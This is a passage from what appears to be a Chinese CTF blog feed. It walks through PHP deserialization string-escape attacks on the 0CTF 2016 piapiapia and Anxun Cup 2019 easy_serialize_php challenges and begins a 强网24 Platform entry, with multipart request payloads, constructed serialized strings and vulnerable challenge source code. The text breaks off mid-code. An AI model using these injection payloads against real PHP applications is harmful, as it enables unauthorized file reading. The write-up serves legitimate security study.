class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br><span class="line">    <span class="comment">// ;&#125;s:5:&quot;email&quot;;s:7:&quot;1@1.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hello&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php 这些就是n2的长度了 --&gt; 83</span></span><br><span class="line">    <span class="comment">// n2 = n1 - 1，所以需要 84 个where</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><h4 id="例1的思考与过程"><a href="#例1的思考与过程" class="headerlink" title="+例1的思考与过程"></a>+例1的思考与过程</h4><ol><li><p>index.php进入，登录有profile.php</p><ol><li>profile.php中存在反序列化，并且有读取文件操作，可以作为可以攻击点</li><li>这里的update.php这里使用的有一些限制，感觉photo这里可能可以进行注入，注意这里是最后一个属性了 -&gt; 或许可以传入伪协议？</li><li>后端使用mysql，md5格式存储密码，可能存在单引号注入(看看filter)</li></ol></li><li><p>这道题的重点不在于管理员，而在于photo的序列化？</p></li><li><p>上传后的文件可以直接访问，直接下载，但是这里不是包含；在profile面的也不行，是img引用，那利用点在哪里呢</p><ol><li>发现对文件内容的过滤几乎没有，phar反序列化？</li></ol></li><li><p>哦对，刚才对profile对象有进行序列化和反序列化，看看</p><ol><li>update.php最后将会序列化内容后加载如mysql中，注意到种类的photo字段总是被作为<code>upload/md5(xxx)</code>，所以也没法用我们的伪协议phar，需要进行绕过 -&gt; <strong>自定义序列化字符串内容</strong>，通过字符串截断进行解决，最终指向phar伪协议反弹shell？</li></ol></li><li><p>fix</p><blockquote><p>wc了看漏了，flag就在config.php中，你看，又急，使得photo指向config.php即可 –&gt; config.php无法直接读，是php文件<br>这里还要确定是否可以通过构造实现，发现是在序列化后再过滤的，符合</p></blockquote></li><li><p>思路有了，开始构造吧</p></li><li><p>最终payload1</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345678910</span></span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname[]&quot;</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>photo<span class="string">&quot;; filename=&quot;</span>muma.php<span class="string">&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">what can i sya</span></span><br><span class="line"><span class="string">------WebKitFormBoundary829AijVZyBKQPaGz--</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="例1的php测试脚本"><a href="#例1的php测试脚本" class="headerlink" title="+例1的php测试脚本"></a>+例1的php测试脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">NULL</span>&gt;<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]) &gt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;strlen(array) is too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;*************************&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;    <span class="comment">// 邮箱需要@和.并且在1-10位之间</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>,<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)&#123;    <span class="comment">// 任何不是数字字母或者长度超过10不行</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>. <span class="variable">$profile</span>[<span class="string">&#x27;&#x27;</span>] .<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sStr</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;filtered str: &quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized normal&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$sStr</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;unserialized filterd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$uStr</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$sStr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$uStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="例1fixed"><a href="#例1fixed" class="headerlink" title="+例1fixed"></a>+例1fixed</h4><blockquote><p>出错了导致最后没有解决payload，其实是对正则表达式的疏漏上，<em><strong>还是要本地多试试!!!</strong></em></p></blockquote><ol><li><p>Q: 下面这个payload跑不通</p><ol><li>A: 数组绕过的preg_match()返回的总是false，这里需要利用nickname的，<code>strlen(array)==NULL</code>进行绕过<code>NULL&gt;10</code>总是返回false</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone[]&quot;</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:7:&quot;</span><span class="number">1</span>@<span class="number">1.</span>com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:5:&quot;</span>hello<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname&quot;</span></span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;photo&quot;</span>; filename=<span class="string">&quot;muma.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">what can i say</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz--</span><br></pre></td></tr></table></figure></li></ol><h2 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h2><h3 id="基础梳理-1"><a href="#基础梳理-1" class="headerlink" title="-基础梳理"></a>-基础梳理</h3><ol><li>底层知识点: 见字符串逃逸标题</li><li><strong>构造方法</strong>: 由于长度不变但是实际内容替换减短会包含后面正常的部分，利用通过长度判断的特性，通过另一个属性值进行构造可以自定义第一个属性后的完全自定义</li></ol><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h4 id="例1的思考与过程-1"><a href="#例1的思考与过程-1" class="headerlink" title="-例1的思考与过程"></a>-例1的思考与过程</h4><ol><li>分析<ol><li><p>思路其实很清晰</p></li><li><p>function show_image拿到flag文件可以的话，phpinfo查看信息 –&gt; auto_append_file:d0g3_f1ag.php</p></li><li><p><code>$SESSION</code>要控制<code>img</code>属性的值，这里有两点注意</p><ol><li>img会同通过img_path设定</li><li>总体会被filter过滤</li></ol></li><li><p>找找控制源，<code>extract($_POST)</code>显然是一个，可以将SESSION覆盖掉，但是最重要的img_path呢？还会加密，没法绕过吧，这里考虑从user处开始通过字符串逃逸获取自定义的反序列化</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. origin</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:8:&quot;img_path&quot;;s:8:&quot;img_path&quot;;s:x:&quot;idontknow&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 2. target</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;whaterver;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;whatever</span></span><br><span class="line"><span class="comment"> * 3. 构造</span></span><br><span class="line"><span class="comment"> *      1. function可以构造img，构造&#125;来忽略后续的既定部分即可，为了不被认为function的一部分将function的部分使用过滤替换掉</span></span><br><span class="line"><span class="comment"> *          a:3&#123;s:4:&quot;user&quot;;s:x:&quot;x&quot;;s:8:&quot;function&quot;;s:yy:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          // yy那里肯定两位数，x处是要被过滤的，可以同故宫算式算出来</span></span><br><span class="line"><span class="comment"> *      2. 需要被吞掉的内容</span></span><br><span class="line"><span class="comment"> *          &quot;;s:8:&quot;function&quot;;s:yy: 长度为22</span></span><br><span class="line"><span class="comment"> *          3*6+4=22    这里要是凑不到可以到function值;前多加进行拼凑，只要被覆盖的长度不变就可以不调</span></span><br><span class="line"><span class="comment"> *      3. 传入参数</span></span><br><span class="line"><span class="comment"> *          user: flagphpphpphpphpphpphp</span></span><br><span class="line"><span class="comment"> *          function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          img: whatever</span></span><br><span class="line"><span class="comment"> *      4. 构造成果序列化的字符串：a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:45:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:8:&quot;img_path&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 4. 打不通，改 --&gt; 因为a:3，数组的话元素数量也要对上</span></span><br><span class="line"><span class="comment"> *      1.  function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;add&quot;;s:5:&quot;hello&quot;;&#125;，其他不变，可以打通了</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="例1总结"><a href="#例1总结" class="headerlink" title="*-例1总结"></a>*-例1总结</h4><ol><li>有机会过一遍phpinfo</li><li><strong>box model</strong>: 在分析时注意一下各个参数之间的关系，不要搞混了，这里理解了序列化后结果和判断条件没有任何关系后会很顺利，不会怪怪的；序列化的function和<code>_SESSION[function]</code>后来也是隔离开的，因为extract的覆盖</li><li><strong>尽量在本地环境上试一试</strong>，纠错快很多</li></ol><h4 id="例1源码"><a href="#例1源码" class="headerlink" title="-例1源码"></a>-例1源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> all in one </tag>
            
            <tag> php serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyRevenge_强网24</title>
      <link href="/2024/11/06/ProxyRevenge_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/06/ProxyRevenge_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Platform_强网24</title>
      <link href="/2024/11/06/Platform_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/06/Platform_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol><li>前端没有东西开扫，有<a href="http://www.zip/">www.zip</a></li><li>目标就是notous…中析构执行任意代码，问题就是访问不到有些难绷，序列化和反序列化？<ol><li>需要从session入手，查查php seesion利用方式，发现有一个反序列化漏洞，看一看，差不多了解了<ol><li>session写入键供后续反序列化，生成notouc…对象，注意到每一次访问都会进行读取，5.5.4后默认php_serialize(复现看不到版本，但是看wp一部分是php方式)，使用竖线<code>|</code>来实现加载时的反序列化</li><li>注意到str_replace有双写绕过，但是数字限定了，需要使用字符串逃逸bro</li></ol></li></ol></li><li>顺带一提一个其他思路：注意到有文件包含，后面有文件写入，可不可以写入文件中进行包含执行？这里肯定不可以，主要还是看线索</li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><ol><li><code>www.zip</code>的内容</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dashboard.php</span></span><br><span class="line">&lt;p&gt;你好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]); <span class="meta">?&gt;</span>！&lt;/p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span 